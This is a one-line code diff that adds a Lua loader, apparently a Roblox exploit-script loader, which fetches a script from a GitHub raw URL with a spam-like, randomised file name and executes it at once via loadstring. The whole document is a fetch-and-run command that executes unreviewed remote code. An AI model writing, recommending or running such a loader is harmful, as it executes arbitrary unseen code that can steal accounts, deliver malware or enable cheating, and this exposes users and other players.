@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/ultron-hide-from-the-hulk-spam7-3xq4owyzmbvu84.lua"))()
